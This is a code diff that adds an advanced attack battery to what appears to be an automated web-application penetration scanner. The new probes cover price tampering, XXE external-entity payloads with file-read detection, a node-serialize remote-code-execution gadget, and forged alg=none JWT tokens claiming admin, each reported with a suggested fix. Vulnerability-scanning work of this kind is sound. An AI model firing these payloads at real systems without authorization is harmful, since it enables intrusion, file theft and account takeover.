@@ -109,6 +109,14 @@ function sanitize(s: string): string {
     .slice(0, 300);
 }
 
+function b64url(s: string): string {
+  return Buffer.from(s, "utf8")
+    .toString("base64")
+    .replace(/\+/g, "-")
+    .replace(/\//g, "_")
+    .replace(/=+$/, "");
+}
+
 interface Hit {
   status: number;
   snippet: string;
@@ -116,11 +124,21 @@ interface Hit {
   text: string;
 }
 
-async function hit(baseUrl: string, method: string, p: string, body?: unknown): Promise<Hit> {
+async function hit(
+  baseUrl: string,
+  method: string,
+  p: string,
+  body?: unknown,
+  headers?: Record<string, string>,
+): Promise<Hit> {
+  const isStr = typeof body === "string";
   const effort: RequestInit = {
     method,
-    headers: body !== undefined ? { "Content-Type": "application/json" } : undefined,
-    body: body !== undefined ? JSON.stringify(body) : undefined,
+    headers: {
+      ...(body !== undefined ? { "Content-Type": isStr ? "application/xml" : "application/json" } : {}),
+      ...(headers ?? {}),
+    },
+    body: body !== undefined ? (isStr ? body : JSON.stringify(body)) : undefined,
     redirect: "manual",
     signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),
   };
@@ -644,6 +662,126 @@ export async function runDynamic(repo: string, routes: PenRoute[]): Promise<PenD
             attack: { method: atk.method, path: p, payload: atk.body && atk.body(marker, canaryUrl) },
             response: { status: res.status, snippet: res.snippet },
             fix: "Parameterize all queries; disable verbose error output in production.",
+          });
+        }
+      }
+
+      /* ---- P1 advanced battery (gated to relevant routes) ---- */
+      const moneyRoute = /(charge|payment|order|checkout|cart|invoice|purchase|subscribe|buy)/i.test(route.path);
+
+      // price-tampering: only on order/payment routes.
+      if (route.method !== "GET" && moneyRoute) {
+        const tPayload = { itemId: "x", amount: "0.01", quantity: 1, price: "0.01" };
+        const tres = await hit(baseUrl, route.method, urlPath, tPayload);
+        attacks++;
+        if (tres.status < 300 && /"(?:amount|total|price)"\s*:\s*("?0\.01"?)/.test(tres.text)) {
+          pushFinding({
+            type: "price-tampering",
+            severity: "critical",
+            confidence: "indicated",
+            title: `client-supplied price accepted on ${routeLabel}`,
+            description: `POSTing amount=0.01 to ${routeLabel} returned HTTP ${tres.status} with the tampered value reflected as the order total — the server trusted the client price. An attacker can checkout at any price.`,
+            route: route.path,
+            method: route.method,
+            attack: { method: route.method, path: urlPath, payload: tPayload },
+            response: { status: tres.status, snippet: tres.snippet },
+            repro: `POST ${urlPath} with { amount: "0.01", quantity: 1 } and observe the total in the response.`,
+            fix: "Recompute amount/price/total server-side from the catalog by item id; never trust client-supplied monetary values.",
+          });
+        }
+      }
+
+      // XXE: only on routes that accept XML.
+      if (route.method !== "GET") {
+        const xmlProbe = await hit(baseUrl, route.method, urlPath, `<?xml version="1.0"?><root>1</root>`, {
+          "Content-Type": "application/xml",
+        });
+        attacks++;
+        if (xmlProbe.status < 400) {
+          const xxeBody = `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "${canaryUrl}">]><root>&xxe;</root>`;
+          const pre = readOutbound(outboundPath);
+          const nextN = pre.length ? Math.max(...pre.map((o) => o.n ?? 0)) : 0;
+          const xres = await hit(baseUrl, route.method, urlPath, xxeBody, { "Content-Type": "application/xml" });
+          attacks++;
+          const inWin = readOutbound(outboundPath).filter((o) => (o.n ?? 0) > nextN);
+          const xxeSsrf = inWin.filter((o) => o.kind === "http" && o.host && o.host.includes("ssrf-canary"));
+          if (xres.status < 300 && (xres.text.includes("root:x:0:0") || xres.text.includes("[extensions]") || xres.text.includes("; for 16-bit app support"))) {
+            pushFinding({
+              type: "xxe",
+              severity: "high",
+              confidence: "proven",
+              title: `XXE file read on ${routeLabel}`,
+              description: `An XML body with an external entity made ${routeLabel} return a host file in the HTTP ${xres.status} response. That is local file disclosure via XML parsing.`,
+              route: route.path,
+              method: route.method,
+              attack: { method: route.method, path: urlPath, payload: xxeBody },
+              response: { status: xres.status, snippet: xres.snippet },
+              fix: "Disable DTDs/external entities in the XML parser (forbidUnknownContent / noEnt:false / disallowDoctype); prefer JSON.",
+            });
+          } else if (xxeSsrf.length > 0) {
+            pushFinding({
+              type: "xxe",
+              severity: "high",
+              confidence: "proven",
+              title: `XXE SSRF on ${routeLabel}`,
+              description: `An XML external entity made the SERVER open a connection to ${canaryHost} (recorded by the sandbox). XXE can also read local files.`,
+              route: route.path,
+              method: route.method,
+              attack: { method: route.method, path: urlPath, payload: xxeBody },
+              response: { status: xres.status, snippet: xres.snippet },
+              outbound: xxeSsrf.slice(0, 3).map((e) => `http → ${e.host}`),
+              fix: "Disable DTDs/external entities in the XML parser; never parse attacker-controlled XML with entity resolution on.",
+            });
+          }
+        }
+      }
+
+      // insecure-deserialization: node-serialize gadget; proven only if a spawn canary fires.
+      if (route.method !== "GET") {
+        const gadget = JSON.stringify({
+          rce: `_$$ND_FUNC$$_function (){require('child_process').execSync('echo ${marker}')}()`,
+        });
+        const pre = readOutbound(outboundPath);
+        const nextN = pre.length ? Math.max(...pre.map((o) => o.n ?? 0)) : 0;
+        const dres = await hit(baseUrl, route.method, urlPath, { data: gadget, payload: gadget, body: gadget });
+        attacks++;
+        const inWin = readOutbound(outboundPath).filter((o) => (o.n ?? 0) > nextN);
+        const deserProof = inWin.filter((o) => o.kind === "spawn" && o.cmd && o.cmd.includes(marker));
+        if (deserProof.length > 0) {
+          pushFinding({
+            type: "insecure-deserialization",
+            severity: "critical",
+            confidence: "proven",
+            title: `insecure deserialization RCE on ${routeLabel}`,
+            description: `A node-serialize gadget in the request body made the SERVER spawn a process containing the marker (cmd: ${deserProof[0].cmd}). That is remote code execution via deserialization.`,
+            route: route.path,
+            method: route.method,
+            attack: { method: route.method, path: urlPath, payload: { data: gadget } },
+            response: { status: dres.status, snippet: dres.snippet },
+            outbound: deserProof.slice(0, 2).map((e) => `spawn: ${e.cmd}`),
+            fix: "Never deserialize untrusted input. Use JSON.parse with a strict schema (zod) and no function/reviver gadgets.",
+          });
+        }
+      }
+
+      // JWT alg=none / weak-secret: on auth-like routes.
+      if (route.loginLike || /(token|auth|login|session|jwt)/i.test(route.path)) {
+        const noneTok = `${b64url('{"alg":"none","typ":"JWT"}')}.${b64url('{"user":"admin","role":"admin"}')}.`;
+        const jres = await hit(baseUrl, route.method, urlPath, undefined, { Authorization: `Bearer ${noneTok}` });
+        attacks++;
+        if (jres.status < 300 && jres.status !== 401 && jres.status !== 403) {
+          pushFinding({
+            type: "jwt-weak-secret",
+            severity: "high",
+            confidence: "indicated",
+            title: `JWT accepted with alg=none on ${routeLabel}`,
+            description: `Sending a forged token signed with alg=none to ${routeLabel} returned HTTP ${jres.status} instead of 401/403. The endpoint does not enforce a signature algorithm — tokens can be forged.`,
+            route: route.path,
+            method: route.method,
+            attack: { method: route.method, path: urlPath, payload: { Authorization: `Bearer ${noneTok}` } },
+            response: { status: jres.status, snippet: jres.snippet },
+            repro: `curl -H "Authorization: Bearer ${noneTok}" ${baseUrl}${urlPath}`,
+            fix: 'Pass `{ algorithms: ["HS256"] }` to jwt.verify and use a strong secret from an env var (>= 32 random bytes).',
           });
         }
       }
